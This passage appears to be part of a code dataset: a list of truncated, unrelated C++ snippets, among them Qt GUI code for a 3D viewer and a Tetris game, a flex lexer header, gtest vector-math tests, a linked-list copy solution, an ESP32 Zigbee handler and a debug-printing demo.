statusUpdateMessage signal to the showMessage slot of the status bar\n    connect(this, &MainWindow::statusUpdateMessage, ui->statusbar, &QStatusBar::showMessage);\n    // Connect the first button to handleButton\n    connect(ui->pushButton, &QPushButton::released, this, &MainWindow::handleButton);\n    // Connect the second button to handleButton2\n    connect(ui->pushButton2, &QPushButton::released, this, &MainWindow::handleButton2);\n    // Connect the tree view click event to handleTreeClicked\n    connect(ui->treeView, &QTreeView::clicked, this, &MainWindow::handleTreeClicked);\n    // Assuming you have a tree view named ui->treeView\n    connect(ui->treeView, &QTreeView::clicked, this, &MainWindow::handleOptionDialog);\n    connect(ui->lightingSlider, &QAbstractSlider::sliderMoved, this, &MainWindow::on_lightingSlider_sliderMoved);\n\n    //connect(ui->treeView, &QTreeView::clicked, this, &MainWindow::on_actionItem_Options_triggered);\n\n    /* Create / allocate the ModelList */\n    this->partList = new ModelPartList(\"Parts List\");\n\n    /* Link it to the tree view in the GUI */\n    ui->treeView->setModel(this->partList);\n\n    /* Manually create a model tree - there are much better and more flexible ways of doing this,\n     * e.g. with nested functions. This is just a quick example as a starting point. */\n    ModelPart* rootItem = this->partList->getRootItem();\n\n    /* Add 3 top level items */\n    for (int i = 0; i < 3; i++) {\n        /* Creates strings for both data columns */\n        QString name = QString(\"TopLevel %1\").arg(i);\n        QString visible(\"true\");\n\n        /* Create child item */\n        ModelPart* childItem = new ModelPart({ name, visible });\n\n        /* Append to tree top-level */\n        rootItem->appendChild(childItem);\n\n        /* Add 5 sub-items */\n        for (int j = 0; j < 5; j++) {\n            QString name = QString(\"Item %1,%2\").arg(i).arg(j);\n            QString visible(\"true\");\n\n            ModelPart* childChildItem = new ModelPart({ name, visible });\n\n            /* Append to parent */\n            childItem->appendChild(childChildItem);\n        }\n    }\n\n}\n\nMainWindow::~MainWindow()\n{\n    delete ui;\n}\n\n\nvoid MainWindow::handleButton()\n{\n    // Emit the statusUpdateMessage signal to update the status bar\n    emit statusUpdateMessage(\"View is reset\", 100); // 100 milliseconds timeout\n    renderer->ResetCamera();\n}\n\nvoid MainWindow::handleButton2()",
    "#line 2 \"tokens.cpp\"\n\n#line 4 \"tokens.cpp\"\n\n#define  YY_INT_ALIGNED short int\n\n/* A lexical scanner generated by flex */\n\n#define FLEX_SCANNER\n#define YY_FLEX_MAJOR_VERSION 2\n#define YY_FLEX_MINOR_VERSION 6\n#define YY_FLEX_SUBMINOR_VERSION 4\n#if YY_FLEX_SUBMINOR_VERSION > 0\n#define FLEX_BETA\n#endif\n\n/* First, we deal with  platform-specific or compiler-specific issues. */\n\n/* begin standard C headers. */\n#include <stdio.h>\n#include <string.h>\n#include <errno.h>\n#include <stdlib.h>\n\n/* end standard C headers. */\n\n/* flex integer type definitions */\n\n#ifndef FLEXINT_H\n#define FLEXINT_H\n\n/* C99 systems have <inttypes.h>. Non-C99 systems may or may not. */\n\n#if defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L\n\n/* C99 says to define __STDC_LIMIT_MACROS before including stdint.h,\n * if you want the limit (max/min) macros for int types. \n */\n#ifndef __STDC_LIMIT_MACROS\n#define __STDC_LIMIT_MACROS 1\n#endif\n\n#include <inttypes.h>\ntypedef int8_t flex_int8_t;\ntypedef uint8_t flex_uint8_t;\ntypedef int16_t flex_int16_t;\ntypedef uint16_t flex_uint16_t;\ntypedef int32_t flex_int32_t;\ntypedef uint32_t flex_uint32_t;\n#else\ntypedef signed char flex_int8_t;\ntypedef short int flex_int16_t;\ntypedef int flex_int32_t;\ntypedef unsigned char flex_uint8_t; \ntypedef unsigned short int flex_uint16_t;\ntypedef unsigned int flex_uint32_t;\n\n/* Limits of integral types. */\n#ifndef INT8_MIN\n#define INT8_MIN               (-128)\n#endif\n#ifndef INT16_MIN\n#define INT16_MIN              (-32767-1)\n#endif\n#ifndef INT32_MIN\n#define INT32_MIN              (-2147483647-1)\n#endif\n#ifndef INT8_MAX\n#define INT8_MAX               (127)\n#endif\n#ifndef INT16_MAX\n#define INT16_MAX              (32767)\n#endif\n#ifndef INT32_MAX\n#define INT32_MAX              (2147483647)\n#endif\n#ifndef UINT8_MAX\n#define UINT8_MAX              (255U)\n#endif\n#ifndef UINT16_MAX\n#define UINT16_MAX             (65535U)\n#endif\n#ifndef UINT32_MAX\n#define UINT32_MAX             (4294967295U)\n#endif\n\n#ifndef SIZE_MAX\n#define SIZE_MAX               (~(size_t)0)\n#endif\n\n#endif /* ! C99 */\n\n#endif /* ! FLEXINT_H */\n\n/* begin standard C++ headers. */\n\n/* TODO: this is always defined, so inline it */\n#define yyconst const\n\n#if defined(__GNUC__) && __GNUC__ >= 3\n#define yynoreturn __attribute__((__noreturn__))\n#else\n#define yynoreturn\n#endif\n\n/* Returned upon end-of-file. */\n#define YY_NULL 0\n\n/* Promotes a possibly negative, possibly signed char to an\n *   integer in range [0..255] for use as an array index.\n */\n#define YY_SC_TO_UI(c) ((YY_CHAR) (c))\n\n/* Enter a start condition.  This macro really ought to take a parameter,\n * but we do it the disgusting crufty way forced on us by the ()-less\n * definition of BEGIN.\n */\n#define BEGIN (yy_start) = 1 + 2 *\n/* Translate the current start state into a value that can be later handed\n * to BEGIN to return to the state.  The YYSTATE alias is for lex\n * compatibility.\n */\n#define YY_START (((yy_start) - 1) / 2)\n#define YYSTATE YY_START\n/* Action number for EOF rule of a given start state. */\n#define YY_STATE_EOF(state) (YY_END_OF_BUFFER + state + 1)\n/* Special action meaning \"start processing a new file\". */\n#define YY_NEW_FILE yyrestart( yyin  )\n#define YY_END_OF_BUFFER_CHAR 0\n\n/* Size of default input buffer. */\n#ifndef YY_BUF_SIZE\n#ifdef __ia64__\n/* On IA-64, the buffer size is 16k, not 8k.\n * Moreover, YY_BUF_SIZE is 2*YY_READ_BUF_SIZE in the general case.\n * Ditto for the __ia64__ case accordingly.\n */\n#define YY_BUF_SIZE 32768\n#else\n#define YY_BUF_SIZE 16384\n#endif /* __ia64__ */\n#endif\n\n/* The state buf must be large enough to hold one state per character in the main buffer.\n */\n#define YY_STATE_BUF_SIZE   ((YY_BUF_SIZE + 2) * sizeof(yy_state_type))\n\n#ifndef YY_TYPEDEF_YY_BUFFER_STATE\n#define YY_TYPEDEF_YY_BUFFER_STATE\ntypedef struct yy_buffer_state *YY_BUFFER_STATE;\n#endif\n\n#ifndef YY_TYPEDEF_YY_SIZE_T\n#define YY_TYPEDEF_YY_SIZE_T\ntypedef size_t yy_size_t;\n#endif\n\nextern int yyleng;\n\nextern FILE *yyin, *yyout;\n\n#define EOB_ACT_CONTINUE_SCAN 0\n#define EOB_ACT_END_OF_FILE 1\n#define EOB_ACT_LAST_MATCH 2\n    \n    #define YY_LESS_LINENO(n)\n    #define YY_LINENO_REWIND_TO(ptr)\n    \n/* Return all but the first \"n\" matched characters back to the input stream. */\n#define yyless(n) \\\n\tdo \\\n\t\t{ \\\n\t\t/* Undo effects of setting up yytext. */ \\\n        int yyless_macro_arg = (n); \\\n        YY_LESS_LINENO(yyless_macro_arg);\\\n\t\t*yy_cp = (yy_hold_char); \\\n\t\tYY_RESTORE_YY_MORE_OFFSET \\\n\t\t(yy_c_buf_p) = yy_cp = yy_bp + yyless_macro_arg - YY_MORE_ADJ; \\\n\t\tYY_DO_BEFORE_ACTION; /* set up yytext again */ \\\n\t\t} \\\n\twhile ( 0 )\n#define unput(c) yyunput( c, (yytext_ptr)  )\n\n#ifndef YY_STRUCT_YY_BUFFER_STATE\n#define YY_STRUCT_YY_BUFFER_STATE\nstruct yy_buffer_state\n\t{\n\tFILE *yy_input_file;\n\n\tchar *yy_ch_buf;\t\t/* input buffer */\n\tchar *yy_buf_pos;\t\t/* current position in input buffer */\n\n\t/* Size of input buffer in bytes, not including room for EOB\n\t * characters.\n\t */\n\tint yy_buf_size;\n\n\t/* Number of characters read into yy_ch_buf, not including EOB\n\t * chara",
    "#include <gmock/gmock.h>\n#include <gtest/gtest.h>\n\n#include \"vector_algebra_utils.h\"\n\ntypedef Point_3 Point_3;\ntypedef Vector_3 Vector_3;\n\nTEST(VectorAlgebraUtilities, CanComputeUnitVectorForZeroVector)\n{\n  Vector_3 zeroVector(0.0, 0.0, 0.0);\n  EXPECT_EQ(unitVector(zeroVector), zeroVector);\n}\n\nTEST(VectorAlgebraUtilities, CanComputeUnitVectorForNonZeroVector)\n{\n  Vector_3 vec(1.0, 1.0, 1.0);\n  Vector_3 expectedVec = (1. / std::sqrt(3.0)) * vec;\n  EXPECT_EQ(unitVector(vec), expectedVec);\n}\n\nTEST(VectorAlgebraUtilities, CannotComputeCentroidForEmptySet)\n{\n  std::vector<Point_3> points;\n  EXPECT_EQ(getCentroid(points), Point_3(0, 0, 0));\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCentroidForPointsAtSquareCorners)\n{\n  std::vector<Point_3> points = {Point_3(0, 0, 0), Point_3(1, 0, 0), Point_3(0, 1, 0), Point_3(1, 1, 0)};\n  EXPECT_EQ(getCentroid(points), Point_3(0.5, 0.5, 0.0));\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCentroidForPointsAtCubeCorners)\n{\n  std::vector<Point_3> points = {Point_3(0, 0, 0), Point_3(1, 0, 0), Point_3(0, 1, 0), Point_3(1, 1, 0),\n                                 Point_3(0, 0, 1), Point_3(1, 0, 1), Point_3(0, 1, 1), Point_3(1, 1, 1)};\n  EXPECT_EQ(getCentroid(points), Point_3(0.5, 0.5, 0.5));\n}\n\nTEST(VectorAlgebraUtilities, CannotComputeCosAngleForZeroVectors)\n{\n  Vector_3 t1(0, 0, 0);\n  Vector_3 t2(0, 0, 0);\n  Vector_3 t3(1, 0, 0);\n  EXPECT_EQ(cosAngle(t1, t2), std::nullopt);\n  EXPECT_EQ(cosAngle(t2, t1), std::nullopt);\n  EXPECT_EQ(cosAngle(t1, t3), std::nullopt);\n  EXPECT_EQ(cosAngle(t3, t1), std::nullopt);\n  EXPECT_EQ(cosAngle(t2, t3), std::nullopt);\n  EXPECT_EQ(cosAngle(t3, t2), std::nullopt);\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCosAngleForCloseToZeroVectors)\n{\n  Vector_3 t1(0.001, 0.000, 0.000);\n  Vector_3 t2(0.000, 0.001, 0.000);\n  Vector_3 t3(0.000, 0.002, 0.000);\n  Vector_3 t4(0.001, 0.000, 0.001);\n  Vector_3 t5(-0.001, 0.000, 0.000);\n\n  // t1 and t2 at 90 degrees -- expected outcome 0\n  auto t1t2 = cosAngle(t1, t2);\n  EXPECT_NE(t1t2, std::nullopt);\n  EXPECT_NEAR(*t1t2, 0.0, 1e-12);\n\n  // t2 and t3 at 0 degrees -- expected outcome 1\n  auto t2t3 = cosAngle(t2, t3);\n  EXPECT_NE(t2t3, std::nullopt);\n  EXPECT_NEAR(*t2t3, 1.0, 1e-12);\n\n  // t4 and t1 at 45 degrees -- expected outcome 1/sqrt(2)\n  auto t4t1 = cosAngle(t4, t1);\n  EXPECT_NE(t4t1, std::nullopt);\n  EXPECT_NEAR(*t4t1, 1.0 / std::sqrt(2.0), 1e-12);\n\n  // t1 and t5 at 180 degrees -- expected outcome -1\n  auto t1t5 = cosAngle(t1, t5);\n  EXPECT_NE(t1t5, std::nullopt);\n  EXPECT_NEAR(*t1t5, -1.0, 1e-12);\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCosAngleForClockVectors)\n{\n  double theta = 2 * M_PI / 12;\n  std::vector<Vector_3> hours = {\n      Vector_3(std::sin(0. * theta), std::cos(0. * theta), 0),    // 0\n      Vector_3(std::sin(1. * theta), std::cos(1. * theta), 0),    // 1\n      Vector_3(std::sin(2. * theta), std::cos(2. * theta), 0),    // 2\n      Vector_3(std::sin(3. * theta), std::cos(3. * theta), 0),    // 3\n      Vector_3(std::sin(4. * theta), std::cos(4. * theta), 0),    // 4\n      Vector_3(std::sin(5. * theta), std::cos(5. * theta), 0),    // 5\n      Vector_3(std::sin(6. * theta), std::cos(6. * theta), 0),    // 6\n      Vector_3(std::sin(7. * theta), std::cos(7. * theta), 0),    // 7\n      Vector_3(std::sin(8. * theta), std::cos(8. * theta), 0),    // 8\n      Vector_3(std::sin(9. * theta), std::cos(9. * theta), 0),    // 9\n      Vector_3(std::sin(10. * theta), std::cos(10. * theta), 0),  // 10\n      Vector_3(std::sin(11. * theta), std::cos(11. * theta), 0),  // 11\n      Vector_3(std::sin(12. * theta), std::cos(12. * theta), 0)   // 12\n  };\n\n  Vector_3 h0 = hours[0];\n  for (std::size_t i = 1; i < hours.size() - 1; i++)\n  {\n    auto ca = cosAngle(h0, hours[i]);\n    EXPECT_NE(ca, std::nullopt);\n    EXPECT_NEAR(*ca, std::cos(i * theta), 1.e-12);\n  }\n}\n\nTEST(VectorAlgebraUtilities, CanComputeCosAngleForClockPoints)\n{\n  double theta = 2 * M_PI / 12;\n  std::vector<Vector_3> hours = {\n      Vector_3(std::sin(0. * theta), std::cos(0. * theta), 0),    // 0\n      Vector_3(std::sin(1. * theta), std::cos(1. * theta), 0),    // 1\n      Vector_3(std::sin(2. * theta), std::cos(2. * theta), 0),    // 2\n      Vector_3(std::sin(3. * theta), std::cos(3. * theta), 0),    // 3\n      Vector_3(std::sin(4. * theta), std::cos(4. * theta), 0),    // 4\n      Vector_3(std::sin(5. * theta), std::cos(5. * theta), 0),    // 5\n      Vector_3(std::sin(6. * theta), std::cos(6. * theta), 0),    // 6\n      Vector_3(std::sin(7. * theta), std::cos(7. * theta), 0),    // 7\n      Vector_3(std::sin(8. * theta), std::cos(8. * theta), 0),    // 8\n      Vector_3(std::sin(9. * theta), std::cos(9. * theta), 0),    // 9\n      Vector_3(std::sin(10. * theta), std::cos(10. * theta), 0),  // 10\n      Vector_3(std::sin(11. * theta), std::cos(11. * theta), 0),  // 11\n      Vector_3(std::sin(12. * theta), std::cos(12. * theta), 0)   // 12\n  };\n\n  // make the third points (o, p0, and pi will be passed to cosAngle, where pi is the ith point in the list)\n  Point_3 o(0, 0, 0",
    "/*\n// Definition for a Node.\nclass Node {\npublic:\n    int val;\n    Node* next;\n    Node* random;\n    \n    Node(int _val) {\n        val = _val;\n        next = NULL;\n        random = NULL;\n    }\n};\n*/\n\nclass Solution {\npublic:\n    Node* copyRandomList(Node* head) {\n        Node* dummyHead = new Node(100000);\n        Node* ptr1 = head;\n        Node* ptr2 = dummyHead;\n        unordered_map<Node*, Node*> map;\n\n        while(ptr1!=NULL) {\n            cout << ptr1->val << endl;\n            Node* tmp = new Node(ptr1->val);\n            map.insert({ptr1, tmp});\n            ptr2->next = tmp;\n            ptr2 = ptr2->next;\n            ptr1 = ptr1->next;\n            tmp = NULL;\n            delete tmp;\n        }\n        ptr2->next = NULL;\n        // traverse again to set random ptr\n        ptr1 = head;\n        ptr2 = dummyHead->next;\n        while(ptr1!=NULL) {\n            ptr2->random = map[ptr1->random];\n            ptr1 = ptr1->next;\n            ptr2 = ptr2->next;\n        }\n\n        return dummyHead->next;\n    }\n};\n",
    "#include \"widget.h\"\n#include \"tetristable.h\"\n#include \"ui_widget.h\"\n#include <QMessageBox>\n#include <QRandomGenerator>\n// #include <QSettings>\n\nWidget::Widget(QWidget *parent) : QWidget(parent), ui(new Ui::Widget) {\n  ui->setupUi(this);\n  QString basePath = QCoreApplication::applicationDirPath();\n  setWindowTitle(\"Qtetris\");\n  setWindowIcon(QIcon(basePath + \"/resources/images/logo.png\"));\n  //  \u6548\u679c\u4e0d\u4f73  this->setStyleSheet(\"background-image:\n  //    url(/home/gh0s7/project/qt6/Qtetris/resources/images/78355322_p0.jpg);\");\n  mediaPlayer = new QMediaPlayer(this);\n  QAudioOutput *audioOutput = new QAudioOutput;\n  audioOutput->setVolume(0.6);\n  mediaPlayer->setAudioOutput(audioOutput);\n  // mediaPlayer->setMedia(QUrl::fromLocalFile(\"/home/gh0s7/project/qt6/Qtetris/resources/audio/flower.ogg\"));\n  // auto *playlist = new QMediaPlaylist();\n  // bgm\u90fd\u662f\u81ea\u5df1\u7528\u5f00\u6e90\u7f16\u66f2\u8f6f\u4ef6lmms\u7f16\u66f2\u7684\uff0c\u539f\u66f2\u6765\u81ea\u4e0a\u6d77\u7231\u8389\u4e1d\u5e7b\u4e50\u56e2qwq\n  QStringList audioFiles = {// \u5e7f\u91cd36\u53f7\n                            basePath + \"/resources/audio/neoexpress.wav\",\n                            // \u5b87\u5b99\u9732\u5929\u5496\u5561\u5ea7\n                            basePath + \"/resources/audio/CafeTerrace.ogg\",\n                            // \u82b1\u5982\u5e7b\u60f3\u4e00\u822c\n                            basePath + \"/resources/audio/flower.ogg\",\n                            // \u5bfb\u627e\u65e5\u672c\u5404\u5904\u4e4b\u795e\u79d8\n                            basePath + \"/resources/audio/mistery.wav\",\n                            // \u65e0\u95f4\u4e4b\u949f\n                            basePath + \"/resources/audio/clock.wav\",\n                            // \u5e7b\u60f3\u51c0\u7409\u7483\n                            basePath + \"/resources/audio/glass.wav\"};\n  currentIndex = 0;\n  mediaPlayer->setSource(QUrl::fromLocalFile(audioFiles[currentIndex]));\n  QObject::connect(\n      mediaPlayer, &QMediaPlayer::mediaStatusChanged, mediaPlayer, [=]() {\n        if (mediaPlayer->mediaStatus() == QMediaPlayer::EndOfMedia) {\n          currentIndex = (currentIndex + 1) % audioFiles.size();\n          mediaPlayer->setSource(QUrl::fromLocalFile(audioFiles[currentIndex]));\n          mediaPlayer->play();\n        }\n      });\n  mediaPlayer->play();\n  /* \u539fqt5\u5199\u6cd5\uff0c\u76f8\u5173\u63a5\u53e3\u5df2\u5e9f\u5f03\n    QString audioPath = basePath + \"/resources/audio/neoexpress.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/CafeTerrace.ogg\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/flower.ogg\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/mistery.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/clock.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n    audioPath = basePath + \"/resources/audio/glass.wav\";\n    playlist->addMedia(QUrl::fromLocalFile(audioPath));\n\n    playlist->setPlaybackMode(QMediaPlaylist::Loop);\n    mediaPlayer->setVolume(50);\n    mediaPlayer->setPlaylist(playlist);\n    mediaPlayer->play();\n  */\n  m_nextBlockState = (QRandomGenerator::global()->bounded(10)) * 4;\n  ui->tableWidget_next->updateBlock(m_nextBlockState);\n  connect(ui->pushButton_music, &QPushButton::clicked, this,\n          &Widget::onMusicButtonClicked);\n  connect(ui->pushButton_start, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_start_onClicked);\n  connect(ui->pushButton_space, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_space_onClicked);\n  connect(ui->pushButton_down, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_down_onClicked);\n  connect(ui->pushButton_left, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_left_onClicked);\n  connect(ui->pushButton_right, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_right_onClicked);\n  connect(ui->pushButton_revolve, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_revolve_onClicked);\n  connect(ui->pushButton_pause, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_pause_onClicked);\n  connect(ui->pushButton_difficulty, &QPushButton::clicked, this,\n          &Widget::slot_pushButton_difficulty_onClicked);\n  connect(ui->pushButton_history, &QPushButton::clicked, this,\n          &Widget::showHistory);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_enter, this,\n          &Widget::slot_pushButton_start_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_up, this,\n          &Widget::slot_pushButton_revolve_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_down, this,\n          &Widget::slot_pushButton_down_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_left, this,\n          &Widget::slot_pushButton_left_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_right, this,\n          &Widget::slot_pushButton_right_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_space, this,\n          &Widget::slot_pushButton_space_onClicked);\n  connect(ui->tableWidget, &tetristable::signal_out_keyPress_pause, this,\n          &Widget::slot_push",
    "/*\r\nesp_zb_get_short_address() - \u0431\u044b\u0441\u0442\u0440\u044b\u0439 \u0441\u043f\u043e\u0441\u043e\u0431 \u0438\u0434\u0435\u043d\u0442\u0438\u0444\u0438\u043a\u0430\u0446\u0438\u0438 \u0441\u0435\u0442\u0438, \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d\u043d\u043e\u0439 \u043f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435. \u0415\u0441\u043b\u0438 \u0441\u0435\u0442\u044c \u043d\u0435 \u043d\u0430\u0441\u0442\u0440\u043e\u0435\u043d\u0430, \u0432\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0431\u0443\u0434\u0435\u0442 0xfffe.\r\n\r\nhttps://github.com/espressif/esp-zigbee-sdk/issues/84\r\n*/\r\n\r\n//#include <Arduino.h>\r\n#include \"esp_log.h\"\r\n#include \"esp_check.h\"\r\n#include \"freertos/FreeRTOS.h\"\r\n#include \"freertos/task.h\"\r\n#include \"esp_zigbee_type.h\"\r\n#include \"esp_zigbee_core.h\"\r\n#include \"esp_ota_ops.h\"\r\n#include \"nvs_flash.h\"\r\n//#include \"ha/esp_zigbee_ha_standard.h\"\r\n//#include \"zcl/esp_zigbee_zcl_command.h\"\r\n//#include \"zdo/esp_zigbee_zdo_command.h\"\r\n//#include \"zb_crc16.h\"\r\n#include \"zb_zcl.h\"\r\n#include \"zbesp_runtime.h\"\r\n//#include \"zbesp_debug.h\"\r\n\r\n#define TAG \"zbesp_runtime\"\r\n\r\nZbDevice *g_device;\r\n\r\n/*\r\nstatic void set_zcl_string(char *buffer, char *value)\r\n{\r\n    buffer[0] = (char) strlen(value);\r\n    memcpy(buffer + 1, value, buffer[0]);\r\n}\r\n*/\r\n\r\nstatic void bdb_start_top_level_commissioning_cb(uint8_t mode_mask)\r\n{\r\n    ESP_ERROR_CHECK(esp_zb_bdb_start_top_level_commissioning(mode_mask));\r\n}\r\n\r\n// https://github.com/espressif/esp-zigbee-sdk/blob/main/examples/esp_zigbee_HA_sample/HA_color_dimmable_light/main/esp_zb_light.c\r\n// https://github.com/espressif/esp-idf/blob/master/examples/zigbee/esp_zigbee_gateway/main/esp_zigbee_gateway.c\r\nextern \"C\" void esp_zb_app_signal_handler(esp_zb_app_signal_t *signal_struct)\r\n{\r\n    uint32_t *p_sg_p = signal_struct->p_app_signal;\r\n    esp_err_t err_status = signal_struct->esp_err_status;\r\n    esp_zb_app_signal_type_t sig_type = (esp_zb_app_signal_type_t)*p_sg_p;\r\n    esp_zb_zdo_signal_leave_params_t *leave_params;\r\n\r\n    ESP_LOGI(TAG, \"ZDO signal: %s (sig_type=0x%x), status: %s\", esp_zb_zdo_signal_to_string(sig_type), sig_type, esp_err_to_name(err_status));\r\n\r\n    switch (sig_type) {\r\n    case ESP_ZB_ZDO_SIGNAL_SKIP_STARTUP:\r\n        ESP_LOGI(TAG, \"Initialize Zigbee stack\");\r\n        esp_zb_bdb_start_top_level_commissioning(ESP_ZB_BDB_MODE_INITIALIZATION);\r\n        break;\r\n    case ESP_ZB_BDB_SIGNAL_DEVICE_FIRST_START:\r\n    case ESP_ZB_BDB_SIGNAL_DEVICE_REBOOT:\r\n        if (err_status == ESP_OK) {\r\n            ESP_LOGI(TAG, \">\");\r\n            if(g_device->p_deferredInitCB) \r\n                ESP_LOGI(TAG, \"Deferred initialization %s\", g_device->p_deferredInitCB() ? \"failed.\" : \"successful.\");\r\n            ESP_LOGI(TAG, \"Device started up in %sfactory-reset mode\", esp_zb_bdb_is_factory_new() ? \"\" : \"NON \");\r\n            if (esp_zb_bdb_is_factory_new()) {\r\n                ESP_LOGI(TAG, \"Start network steering\");\r\n                esp_zb_bdb_start_top_level_commissioning(ESP_ZB_BDB_MODE_NETWORK_STEERING);\r\n            } else {\r\n                g_device->setJoined(true); // \u043f\u0435\u0440\u0435\u0437\u0430\u0433\u0440\u0443\u0437\u043a\u0430, \u0441\u0447\u0438\u0442\u0430\u0435\u043c, \u0447\u0442\u043e \u0443\u0441\u0442\u0440\u043e\u0439\u0441\u0442\u0432\u043e \u0441\u0430\u043c\u043e \u0432\u043e\u0439\u0434\u0435\u0442 \u0432 \u0441\u0435\u0442\u044c\r\n                ESP_LOGI(TAG, \"Device was rebooted\");\r\n            }\r\n        } else {\r\n            ESP_LOGW(TAG, \"Failed to initialize Zigbee stack (status: %s), try to factory reset.\", esp_err_to_name(err_status));\r\n        }\r\n        break;\r\n    case ESP_ZB_BDB_SIGNAL_STEERING:\r\n        if (err_status == ESP_OK) {\r\n            g_device->setJoined(true);\r\n            esp_zb_ieee_addr_t extended_pan_id;\r\n            esp_zb_get_extended_pan_id(extended_pan_id);\r\n            ESP_LOGI(TAG, \"Joined network successfully (Extended PAN ID: %02x:%02x:%02x:%02x:%02x:%02x:%02x:%02x, PAN ID: 0x%04hx, Channel:%d, Short Address: 0x%04hx)\",\r\n                     extended_pan_id[7], extended_pan_id[6], extended_pan_id[5], extended_pan_id[4],\r\n                     extended_pan_id[3], extended_pan_id[2], extended_pan_id[1], extended_pan_id[0],\r\n                     esp_zb_get_pan_id(), esp_zb_get_current_channel(), esp_zb_get_short_address());\r\n        } else {\r\n            g_device->setJoined(false);\r\n            ESP_LOGI(TAG, \"Network steering was not successful (status: %s)\", esp_err_to_name(err_status));\r\n            esp_zb_scheduler_alarm((esp_zb_callback_t)bdb_start_top_level_commissioning_cb, ESP_ZB_BDB_MODE_NETWORK_STEERING, 1000);\r\n        }\r\n        break;\r\n    case ESP_ZB_NWK_SIGNAL_PERMIT_JOIN_STATUS:\r\n        if (err_status == ESP_OK) {\r\n            if (*(uint8_t *)esp_zb_app_signal_get_params(p_sg_p)) {\r\n                ESP_LOGI(TAG, \"Network(0x%04hx) is open for %d seconds\", esp_zb_get_pan_id(), *(uint8_t *)esp_zb_app_signal_get_params(p_sg_p));\r\n            } else {\r\n                ESP_LOGW(TAG, \"Network(0x%04hx) closed, devices joining not allowed.\", esp_zb_get_pan_id());\r\n            }\r\n        }\r\n        break;\r\n\r\n        //https://github.com/otaviojr/zigbee_light_sensor/blob/master/main.c\r\n        //https://github.com/espressif/esp-zigbee-sdk/issues/66\r\n\r\n    case ESP_ZB_ZDO_SIGNAL_LEAVE:\r\n        leave_params = (esp_zb_zdo_signal_leave_params_t *) esp_zb_app_signal_get_params(p_sg_p);\r\n        //ESP_LOGI(TAG, \"****** ESP_ZB_ZDO_SIGNAL_LEAVE (leave_type=%d)\", leave_params->leave_type);\r\n        g_device->setJoined(false);\r\n        if (leave_params->leave_type == ESP_ZB_NWK_LEAVE_TYPE_RESET) {\r\n            E",
    "#define DEBUG_SHOW_THREAD_ID 1\n#include \"debug.hpp\"\n#include <map>\n#include <set>\n#include <chrono>\n#include <memory>\n#if __cplusplus >= 201703L\n# ifdef __has_include\n#  if __has_include(<variant>)\n#   include <variant>\n#  endif\n#  if __has_include(<optional>)\n#   include <optional>\n#  endif\n#  if __cplusplus >= 202002L\n#   if __has_include(<span>)\n#    include <span>\n#   endif\n#  endif\n# endif\n#endif\n#include <string>\n#include <vector>\n#include <functional>\n\nstruct Student {\n    std::string name;\n    int age;\n\n    DEBUG_REPR(name, age);\n};\n\nstruct Student2 {\n    std::string name;\n    int age;\n};\n\nDEBUG_REPR_GLOBAL(Student2, name, age);\n\ntemplate <class Name, class Age>\nstruct Student3 {\n    Name name;\n    Age age;\n};\n\nDEBUG_REPR_GLOBAL_TEMPLATED(Student3, (Name, Age), (class Name, class Age), name, age);\n\nstruct Student4 {\n#if DEBUG_PP_VA_OPT_SUPPORT(?)\n    DEBUG_REPR();\n#endif\n};\n\nint main() {\n    debug(), 1;\n#if 0\n    int i = 42;\n    debug(), \"the answer:\", i;\n    std::vector<int> a{1, 2, 3, 4, 5};\n    debug(), a;\n    std::tuple<int, std::string> b{42, \"answer\"};\n    debug(), b;\n    std::vector<std::string> c{\"hello\", \"world\"};\n    debug(), c;\n    std::map<std::string, int> d{{\"hello\", 1}, {\"world\", 2}};\n    debug(), d;\n    std::set<int> e{1, 2, 3, 4, 5};\n    debug(), e;\n    std::string f = \"Hello, world!\";\n    debug(), f;\n    std::unique_ptr<int> g(new int(42));\n    debug(), g;\n    std::unique_ptr<int> h = nullptr;\n    debug(), h;\n    std::shared_ptr<int> j(new int(42));\n#if __cplusplus >= 201703L\n# ifdef __cpp_lib_optional\n    debug(), j;\n    std::optional<int> k = 42;\n    debug(), k;\n    std::optional<int> l = std::nullopt;\n    debug(), l;\n# endif\n# ifdef __cpp_lib_variant\n    std::variant<int, std::string> m = \"hello\";\n    debug(), m;\n# endif\n# ifdef __cpp_lib_string_view\n    std::string_view n = \"hello\";\n    debug(), n;\n# endif\n#endif\n    struct Test {};\n\n    Test o;\n    debug(), o;\n    std::function<void()> p = [] {\n    };\n    debug(), p;\n    std::u32string q = U\"hello\";\n    debug(), q;\n    std::vector<std::uint8_t> r = {1, 2, 3};\n    debug(), r;\n    std::vector<std::uint16_t> s = {1, 2, 3};\n    debug(), s;\n    std::uint8_t t = 42;\n    debug(), t;\n    char u = 42;\n    debug(), u;\n    char16_t v = 42;\n    debug(), v;\n#if __cplusplus >= 202002L\n# ifdef __cpp_char8_t\n    char8_t w = 42;\n    debug(), w;\n# endif\n#endif\n    wchar_t x = 